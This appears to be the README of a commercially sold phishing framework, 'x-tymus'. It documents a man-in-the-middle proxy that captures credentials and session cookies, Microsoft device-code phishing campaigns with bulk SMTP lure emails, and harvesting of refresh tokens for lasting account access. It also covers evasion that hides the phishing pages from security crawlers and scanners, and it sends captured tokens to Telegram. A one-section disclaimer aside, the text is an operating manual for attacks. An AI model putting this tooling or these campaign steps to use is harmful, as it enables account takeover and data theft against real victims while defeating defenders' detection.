```
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ██╗  ██╗ ◆  ████████╗██╗   ██╗███╗   ███╗██╗   ██╗███████╗            ║
║   ╚██╗██╔╝ ◆  ╚══██╔══╝╚██╗ ██╔╝████╗ ████║██║   ██║██╔════╝            ║
║    ╚███╔╝  ◆     ██║    ╚████╔╝ ██╔████╔██║██║   ██║███████╗             ║
║    ██╔██╗  ◆     ██║     ╚██╔╝  ██║╚██╔╝██║██║   ██║╚════██║             ║
║   ██╔╝ ██╗ ◆     ██║      ██║   ██║ ╚═╝ ██║╚██████╔╝███████║             ║
║   ╚═╝  ╚═╝ ◆     ╚═╝      ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚══════╝            ║
║                                                                           ║
║      ☠  PRO VERSION  ☠                           ⚡ v4.0.0 ⚡            ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

> **x-tymus** — Advanced man-in-the-middle phishing framework with StealthAI bot detection, proxy rotation, GoPhish integration, and Playwright browser automation.

**Contact / Order:** https://t.me/x-tymus

---

## Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Command Reference](#command-reference)
- [Configuration Reference](#configuration-reference)
- [Device Code Flow](#device-code-flow)
- [StealthAI](#stealthai)
- [GoPhish Integration](#gophish-integration)
- [Proxy System](#proxy-system)
- [Blacklist & Bot Protection](#blacklist--bot-protection)
- [Admin API](#admin-api)
- [Playwright Automation](#playwright-automation)
- [CAPTCHA Support](#captcha-support)
- [Directory Structure](#directory-structure)
- [Build](#build)

---

## Features

### Phishing Engine
- YAML-based phishlet templates with full customisation
- Multi-domain proxy hosting — map subdomains to legitimate targets
- Automatic credential capture (username, password, custom POST fields)
- Cookie and session token interception across multiple domains
- HTTP header and response body token extraction
- JavaScript injection into proxied pages with trigger support
- HTTP response interception — return custom bodies and MIME types
- Force-POST injection — silently inject form fields (e.g. "Remember me")
- Parent/child phishlet templates with dynamic parameter substitution `{param}`
- Subdomain content substitution (`sub_filters`)
- Per-phishlet `unauth_url` override

### Lure System
- Per-lure custom hostname, path, and redirect URL
- User-Agent regex filtering per lure
- OpenGraph metadata per lure (title, description, image, URL)
- HTML redirector pages
- Lure pause/unpause with duration (`1d2h3m`)
- Custom info labels per lure
- Batch parameter import from TXT / CSV / JSON
- Batch URL export to TXT / CSV / JSON

### Session & Credential Capture
- Real-time credential logging with timestamps
- Full cookie/token dump per session
- Custom field capture beyond standard credentials
- Remote IP, User-Agent, and landing URL per session
- Session range deletion (`1-5,7,10-15`) and bulk delete
- Session export to JSON or CSV

### StealthAI Bot Detection
- Python ML service (LSTM + Isolation Forest + IOC scoring)
- Three-tier scoring: 60% behaviour + 30% anomaly + 10% threat intel
- Score > 0.85 → redirect to Google (bot)
- Score 0.5–0.85 → redirect to Bing (suspicious)
- Score < 0.5 → allow through
- Runs as persistent HTTP server on `127.0.0.1:5001`
- Graceful fallback if ML libraries unavailable

### Bot Blocking
- Built-in detection for GoogleBot, BingBot, BaiduSpider, Yandex, DuckDuckBot, Yahoo Slurp, FacebookExternalHit, TwitterBot, LinkedInBot, AdsBot-Google, AppleBot
- Custom User-Agent regex blocklist
- Automatic IP blacklisting on bot detection
- IP feed integration with configurable update interval

### Proxy System
- HTTP, HTTPS, SOCKS5, SOCKS5H upstream proxy support
- Proxy list auto-loaded from `core/proxylist.txt`
- Proxy rotation (round-robin)
- Per-proxy connection validation at startup
- GoPhish requests routed through proxy

### Blacklist & IP Filtering
- Individual IP and CIDR range blacklisting
- Persistent storage with audit log
- Whitelist CIDRs to prevent false positives
- ASN-based whitelist with configurable lookup API
- Four modes: `all`, `unauth`, `noadd`, `off`
- Admin HTTP API for runtime management

### TLS / Certificate Management
- Let's Encrypt AutoCert with automatic renewal (`certmagic`)
- Self-signed CA + per-site certificates (developer mode)
- Custom certificate loading from `~/.x-tymus/crt/sites/<hostname>/`
- Supports `fullchain.pem` / `privkey.pem` and `.pem`/`.crt` + `.key` pairs
- `config autocert on/off` toggle

### GoPhish Integration
- Email open tracking
- Link click tracking
- Credential submission reporting
- Proxy-aware API calls
- Connection test command

### Device Code Flow (OAuth2)
- Microsoft device code authentication flow
- Single target or bulk campaign targeting
- Automated email delivery via SMTP
- Access token, refresh token, and ID token capture
- Refresh token exchange for custom scopes (Graph, Teams, etc.)
- Landing page with user code display
- Built-in email templates (security alert, IT helpdesk)
- Telegram notifications on token capture
- Persistent state with automatic resumption on restart

### Playwright Browser Automation
- Headless Chrome automation
- Human-like typing simulation (character-by-character)
- Cookie collection and serialisation
- Anti-automation detection bypass flags
- JavaScript injection

### CAPTCHA Support
- Cloudflare Turnstile (site key + private key)
- Google reCAPTCHA v2/v3 (site key + private key)

### DNS
- Internal DNS resolver for A and CNAME records
- Configurable DNS port (default 53)
- Custom DNS entries via `config dnsentry`

### Notifications
- Telegram webhook — instant alert on credential capture
- Configurable bot token and chat ID

### Terminal
- Interactive CLI with command history
- Tab-completion for all commands and arguments
- Coloured output with status indicators
- ASCII table formatting for sessions, phishlets, lures

---

## Requirements

- Linux (recommended) or macOS
- Go 1.22+
- Python 3.9+ (for StealthAI)
- git

---

## Installation

```bash
# Clone / copy the project
cd /root/x-tymus

# Install Go dependencies
go mod download

# Build
go build -o build/x-tymus .

# Set up StealthAI (optional but recommended)
cd ai
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Alternatively use `make`:

```bash
make        # builds to ./build/x-tymus
make clean  # removes build artifact
```

**Windows:**

```bat
build.bat          :: build only
build_run.bat      :: build + run in developer mode
```

---

## Quick Start

```bash
# Start StealthAI service (background)
cd ai && source .venv/bin/activate
nohup python3 stealth_ai_server.py &> /tmp/stealthai.log &

# Run x-tymus
cd /root/x-tymus
./build/x-tymus -p ./phishlets -t ./redirectors

# Developer mode (self-signed certs, no Let's Encrypt)
./build/x-tymus -p ./phishlets -developer -debug
```

**Minimum setup inside the terminal:**

```
config domain yourdomain.com
config ipv4 external 1.2.3.4
phishlets enable <phishlet>
lures create <phishlet>
lures get-url 0
```

---

## Command Reference

### General

| Command | Description |
|---|---|
| `help` | Show all commands |
| `help <cmd>` | Show help for specific command |
| `clear` | Clear screen |
| `exit` / `quit` / `q` | Exit |

### Config

| Command | Description |
|---|---|
| `config domain <domain>` | Set base phishing domain |
| `config ipv4 external <ip>` | Set external IPv4 address |
| `config ipv4 bind <ip>` | Set bind IPv4 address |
| `config https_port <port>` | HTTPS port (default 443) |
| `config dns_port <port>` | DNS port (default 53) |
| `config unauth_url <url>` | Redirect for unauthorized requests |
| `config autocert on\|off` | Enable/disable Let's Encrypt |
| `config dnsentry <name> <type> <value>` | Add custom DNS A/CNAME entry |
| `config stealthai on\|off` | Enable/disable StealthAI |
| `config webhook_telegram <token> <chat_id>` | Telegram notifications |
| `config turnstile_sitekey <key>` | Cloudflare Turnstile site key |
| `config turnstile_privkey <key>` | Cloudflare Turnstile private key |
| `config recaptcha_sitekey <key>` | Google reCAPTCHA site key |
| `config recaptcha_privkey <key>` | Google reCAPTCHA private key |
| `config smtp_host <host>` | SMTP server hostname |
| `config smtp_port <port>` | SMTP port (default 587) |
| `config smtp_user <user>` | SMTP username |
| `config smtp_pass <pass>` | SMTP password |
| `config smtp_from <email>` | Sender email address |
| `config dc_landing_host <host>` | Device code landing page hostname |

### Phishlets

| Command | Description |
|---|---|
| `phishlets` | List all phishlets |
| `phishlets <name>` | Show phishlet details |
| `phishlets enable <name>` | Enable phishlet (requests cert) |
| `phishlets disable <name>` | Disable phishlet |
| `phishlets hide <name>` | Hide phishing page |
| `phishlets unhide <name>` | Unhide phishing page |
| `phishlets hostname <name> <hostname>` | Set phishlet hostname |
| `phishlets unauth_url <name> <url>` | Override redirect for this phishlet |
| `phishlets create <template> <child> [k=v ...]` | Create child phishlet |
| `phishlets delete <name>` | Delete child phishlet |
| `phishlets get-hosts <name>` | Print /etc/hosts entries for local testing |

### Lures

| Command | Description |
|---|---|
| `lures` | List all lures |
| `lures <id>` | Show lure details |
| `lures create <phishlet>` | Create new lure |
| `lures delete <id\|range\|all>` | Delete lure(s) |
| `lures get-url <id> [params]` | Generate phishing URL |
| `lures get-url <id> import <file> export <file> <format>` | Batch URL generation |
| `lures edit <id> hostname <hostname>` | Custom hostname |
| `lures edit <id> path <path>` | Custom URL path |
| `lures edit <id> redirect_url <url>` | Post-capture redirect |
| `lures edit <id> redirector <dir>` | HTML redirector page |
| `lures edit <id> phishlet <name>` | Change phishlet |
| `lures edit <id> info <text>` | Campaign label |
| `lures edit <id> ua_filter <regex>` | User-Agent filter |
| `lures edit <id> og_title <title>` | OpenGraph title |
| `lures edit <id> og_desc <desc>` | OpenGraph description |
| `lures edit <id> og_image <url>` | OpenGraph image URL |
| `lures edit <id> og_url <url>` | OpenGraph URL |
| `lures pause <id> <duration>` | Pause lure (e.g. `1d2h30m`) |
| `lures unpause <id>` | Resume paused lure |

### Sessions

| Command | Description |
|---|---|
| `sessions` | List all captured sessions |
| `sessions <id>` | Full session detail (creds, tokens, cookies) |
| `sessions delete <id\|range\|all>` | Delete session(s) |
| `sessions export <id\|all> <json\|csv>` | Export sessions to file |

### Proxy

| Command | Description |
|---|---|
| `proxy` | Show proxy configuration |
| `proxy enable\|disable` | Toggle proxy usage |
| `proxy type <http\|https\|socks5\|socks5h>` | Set proxy type |
| `proxy address <addr>` | Set proxy address |
| `proxy port <port>` | Set proxy port |
| `proxy username <user>` | Proxy auth username |
| `proxy password <pass>` | Proxy auth password |
| `proxy add <type> <addr> <port> [user] [pass]` | Add proxy to rotation list |
| `proxy rotate` | Rotate to next proxy |

### Blacklist

| Command | Description |
|---|---|
| `blacklist all` | Block all requests |
| `blacklist unauth` | Block unauthorized requests only |
| `blacklist noadd` | Block but don't persist |
| `blacklist off` | Disable blacklist |

### GoPhish

| Command | Description |
|---|---|
| `config gophish admin_url <url>` | GoPhish admin URL |
| `config gophish api_key <key>` | GoPhish API key |
| `config gophish insecure <true\|false>` | Skip TLS verify |
| `config gophish test` | Test connection |

### Device Code

| Command | Description |
|---|---|
| `dc start <email\|tenant>` | Start single device code flow |
| `dc campaigns` | List all campaigns |
| `dc campaigns <id>` | Show campaign details |
| `dc targets` | List all targets (all campaigns) |
| `dc targets <id>` | Show target details |
| `dc launch <name> <template> <file>` | Launch bulk campaign (emails from file) |
| `dc refresh <id> <scope>` | Refresh token for different scope |
| `dc inject <id>` | Generate token injection script |

---

## Configuration Reference

Default config: `~/.x-tymus/config.json`

```json
{
  "general": {
    "domain": "yourdomain.com",
    "external_ipv4": "1.2.3.4",
    "bind_ipv4": "0.0.0.0",
    "https_port": 443,
    "dns_port": 53,
    "unauth_url": "https://www.google.com",
    "autocert": true
  },
  "blacklist": {
    "mode": "unauth",
    "ua_regex": ["(?i)googlebot|bingbot|bot|crawler|selenium|headless"],
    "feeds": ["https://example.com/badips.txt"],
    "feed_interval": 3600,
    "whitelist": ["127.0.0.1/32"],
    "enable_asn_lookup": false,
    "asn_lookup_url": "",
    "asn_whitelist": []
  },
  "stealthai": true,
  "gophish": {
    "admin_url": "",
    "api_key": "",
    "insecure": false
  },
  "turnstile_sitekey": "",
  "turnstile_privkey": "",
  "recaptcha_sitekey": "",
  "recaptcha_privkey": "",
  "smtp": {
    "host": "smtp.office365.com",
    "port": 587,
    "user": "noreply@company.com",
    "pass": "",
    "from": "IT Support <noreply@company.com>"
  },
  "dc_landing_host": "phish.attacker.com"
}
```

---

## Device Code Flow

⚠️ **IMPORTANT: Educational Use Only**
This documentation covers Device Code Flow attacks for authorized red-team exercises, penetration testing, and defensive security research only. Unauthorized access to computer systems is illegal. Only use this feature within:
- Controlled lab environments
- Authorized penetration tests with written approval
- Your own test accounts
- Educational settings with explicit consent

Device Code Flow is an OAuth2 authentication method that allows users to authenticate on a secondary device. This is exploited by x-tymus to capture access tokens, refresh tokens, and identity information from Office 365 / Microsoft accounts.

**Defensive perspective:** Organizations should educate users about device code phishing, implement multi-factor authentication, monitor for unusual OAuth token activity, and use conditional access policies.

**How it works:**

1. Attacker initiates a device code request to Microsoft's OAuth endpoint
2. Microsoft returns a user code and verification URI
3. Attacker sends phishing email with the user code
4. Victim navigates to `microsoft.com/devicelogin` and enters the code
5. Victim signs in with their Office 365 credentials
6. Microsoft issues tokens back to the attacker's session
7. x-tymus captures and logs all tokens (access, refresh, ID)
8. Attacker can use refresh tokens to access victim's resources indefinitely

### Single Target

Start a device code flow for one user:

```
dc start user@company.com
dc targets
dc targets 1
```

The target receives no email (manual delivery required). The device code remains valid for 15 minutes while x-tymus polls for token capture.

### Bulk Campaign

Launch a campaign targeting multiple users with automated SMTP email delivery:

```
config smtp_host smtp.office365.com
config smtp_port 587
config smtp_user phishing-account@attacker.com
config smtp_pass PASSWORD
config smtp_from "IT Support <support@attacker.com>"
config dc_landing_host phish.attacker.com

dc launch "Q4 Security Audit" security_alert emails.txt
```

**emails.txt format (one per line):**
```
user1@company.com
user2@company.com
user3@company.com
```

The campaign automatically:
- Initiates device code flows for each email
- Generates unique verification URIs and user codes
- Sends phishing emails via SMTP
- Polls for token capture
- Logs tokens upon completion
- Notifies via Telegram (if configured)

### Email Templates

Two built-in templates:

**`security_alert`** (default)
- Subject: "Microsoft Security Alert: Sign-in Verification Required — [random 6 digits]"
- Mimics Microsoft account security notice
- Displays user code in a highlighted box
- Includes "Complete Verification" button
- Responsive HTML for mobile/desktop

**`it_helpdesk`**
- Subject: "Action Required: Verify Your Identity — [Domain]"
- Frames verification as IT-initiated identity check
- Displays user code prominently
- Includes urgency ("within 15 minutes")
- Microsoft branding and professional styling

Custom templates can be loaded from disk:
- Create `letter.html` in working directory for custom email body
- Create `subject.txt` in working directory for custom subject line
- Templates support personalization tokens (see below)

### Personalization Tokens

Email templates and landing pages support dynamic token replacement:

| Token | Example | Notes |
|---|---|---|
| `USER` | `john` | Username part of email |
| `DOMAIN` | `company.com` | Email domain |
| `DOMs` | `company` | First label of domain (before dot) |
| `DOMC` | `Company` | Capitalized domain label |
| `SILENTCODERSEMAIL` | `john@company.com` | Full email address |
| `SILENTCODERSEMAILURL` | `john%40company.com` | URL-encoded email (safe for URLs) |
| `EMAILURLSILENTC0DERS` | `am9obkBjb21wYW55...` | Base64-encoded email |
| `DCCODE` | `ABCD-1234` | Device code (auto-inserted) |
| `DCLINK` | `https://...` | Microsoft deviceauth URL (auto-inserted) |
| `DCLANDING` | `https://phish.../dc/token` | Attacker landing page URL (auto-inserted) |
| `SILENTCODERSNUMBER` | `847291` | Random 6-digit number |
| `SILENTCODERSLIMAHURUF` | `xkqmj` | Random 5-letter string |
| `SILENTCODERSBANYAKHURUF` | `[50 random letters]` | Random 50-letter string |

Example subject line:
```
Security Alert for USER@DOMAIN — Action Required
```
Becomes:
```
Security Alert for john@company.com — Action Required
```

### Token Capture & Refresh

Upon successful authentication, x-tymus captures:

- **access_token** — Short-lived (1h) token for immediate API access
- **refresh_token** — Long-lived token that refreshes access tokens indefinitely
- **id_token** — JWT containing identity claims (email, name, tenant ID)
- **device_code** — Internal tracking identifier
- **user_code** — Code victim entered

Refresh tokens can be exchanged for tokens with different scopes:

```
dc refresh 1 "https://graph.microsoft.com/.default"
```

Returns a new access token for Microsoft Graph API calls.

### Landing Page

Served at `https://<dc_landing_host>/dc/<token>`

The landing page:
- Displays the user code prominently (large, selectable text)
- Includes "Verify Now" button linking to `microsoft.com/devicelogin`
- Auto-copies code to clipboard and redirects after 3 seconds
- Styled to resemble DocuSign document review notification
- Tracks impressions (landing page served = victim received email)

### State Persistence

Device code state is automatically saved to `dc_state.json`:

```json
[
  {
    "id": 1,
    "campaign_id": 0,
    "email": "user@company.com",
    "tenant": "company.com",
    "landing_token": "a1b2c3d4e5f6...",
    "user_code": "ABCD-1234",
    "status": "completed",
    "access_token": "eyJ0eXAi...",
    "refresh_token": "0.ARwAr...",
    "id_token": "eyJ0eXAi...",
    "started_at": "2025-01-15T14:22:00Z",
    "expires_in": 900
  }
]
```

On restart, x-tymus automatically resumes polling for pending targets that haven't expired.

### Notifications

**Telegram alerts** (optional):

When a token is captured, x-tymus sends:
1. Target email + user code
2. Access token (full)
3. Refresh token (full)

Enable with:
```
config webhook_telegram BOT_TOKEN CHAT_ID
```

---

## StealthAI

StealthAI is a Python ML service that scores each incoming request for bot-like behaviour.

**Start the service:**

```bash
cd ai
source .venv/bin/activate
nohup python3 stealth_ai_server.py &> /tmp/stealthai.log &
```

**Scoring model:**

| Layer | Weight | Method |
|---|---|---|
| Behaviour analysis | 60% | LSTM recurrent model |
| Anomaly detection | 30% | Isolation Forest |
| Threat intel IOC | 10% | Known bad indicator matching |

**Score thresholds:**

| Score | Action |
|---|---|
| > 0.85 | Redirect → google.com (bot) |
| 0.5 – 0.85 | Redirect → bing.com (suspicious) |
| < 0.5 | Allow through |

**Enable/disable:**

```
config stealthai on
config stealthai off
```

---

## GoPhish Integration

```
config gophish admin_url https://127.0.0.1:3333
config gophish api_key YOUR_API_KEY
config gophish insecure true
config gophish test
```

Events automatically reported to GoPhish:
- Email opened
- Link clicked
- Credentials submitted

---

## Proxy System

**Load from file** — add proxies to `core/proxylist.txt` (one per line):

```
socks5://user:pass@1.2.3.4:1080
http://1.2.3.4:8080
```

Proxies are validated at startup. Valid proxies are shown in green, failed in red. Rotation is automatic.

**Runtime:**

```
proxy add socks5 1.2.3.4 1080 user pass
proxy rotate
proxy enable
```

---

## Blacklist & Bot Protection

```
blacklist unauth        # recommended default
```

**IP Feed auto-update:**

```json
"feeds": ["https://example.com/feed.txt"],
"feed_interval": 3600
```

**Runtime blacklist file:** `~/.x-tymus/blacklist.txt`  
**Audit log:** `~/.x-tymus/blacklist.txt.audit.log`

---

## Admin API

Exposed on port 80. Restrict to localhost in production.

```bash
# List
curl http://127.0.0.1:80/admin/blacklist

# Add
curl -X POST -H "Content-Type: application/json" \
  -d '{"ip":"1.2.3.4"}' http://127.0.0.1:80/admin/blacklist

# Remove
curl -X DELETE -H "Content-Type: application/json" \
  -d '{"ip":"1.2.3.4"}' http://127.0.0.1:80/admin/blacklist

# Flush all
curl -X POST http://127.0.0.1:80/admin/blacklist/flush
```

---

## Playwright Automation

Built-in headless Chrome automation for automated session collection:
- Human-like typing simulation
- Cookie serialisation
- Anti-detection browser flags
- JavaScript injection support

---

## CAPTCHA Support

```
config turnstile_sitekey <key>
config turnstile_privkey <key>

config recaptcha_sitekey <key>
config recaptcha_privkey <key>
```

---

## Directory Structure

```
~/.x-tymus/
├── config.json              # main configuration
├── data.db                  # session database
├── blacklist.txt            # persistent IP blacklist
├── blacklist.txt.audit.log  # audit log
└── crt/
    └── sites/
        └── <hostname>/
            ├── fullchain.pem
            └── privkey.pem

./
├── phishlets/               # phishlet YAML files
├── redirectors/             # HTML redirector templates
├── ai/                      # StealthAI Python service
│   ├── stealth_ai_server.py
│   └── stealth_ai.py
└── build/
    └── x-tymus              # compiled binary
```

---

## Build

```bash
# Linux / macOS
make

# Manual
go build -o build/x-tymus .

# Windows
build.bat
```

**Flags:**

| Flag | Description |
|---|---|
| `-p <path>` | Phishlets directory |
| `-t <path>` | Redirectors directory |
| `-c <path>` | Config directory |
| `-debug` | Enable debug logging |
| `-developer` | Self-signed certs, skip Let's Encrypt |
| `-v` | Show version |

---

© 2025 x-tymus — https://t.me/x-tymus
# project-x
